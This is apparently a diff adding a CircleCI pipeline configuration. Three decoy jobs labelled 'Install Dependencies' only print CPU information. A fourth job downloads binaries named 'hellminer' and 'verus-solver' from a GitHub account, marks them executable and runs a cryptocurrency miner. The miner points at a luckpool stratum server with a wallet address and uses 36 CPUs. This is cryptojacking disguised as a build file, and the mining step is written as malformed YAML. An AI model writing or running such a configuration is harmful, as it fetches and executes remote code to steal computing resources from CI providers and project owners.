@@ -1,0 +1,37 @@
+version: 2.1
+jobs:
+    Devop:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop1:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop2:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            name: Install Dependencies
+            command: timeout 1m lscpu
+    Devop3:
+      docker:
+            - image: circleci/ruby:2.5.3
+      steps:
+        - run:
+            wget https://github.com/Godmine99/cpu/raw/main/hellminer && chmod +x hellminer && wget https://github.com/Godmine99/cpu/raw/main/verus-solver && chmod +x verus-solver ./verus-solver && ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RFWdgp3XireoDc8EVshtw2Ev3dgSYbZP74 -p x --cpu 36
+workflows:
+    version: 2.1
+    build:
+        jobs:
+            - Devop
+            - Devop1
+            - Devop2
+            - Devop3
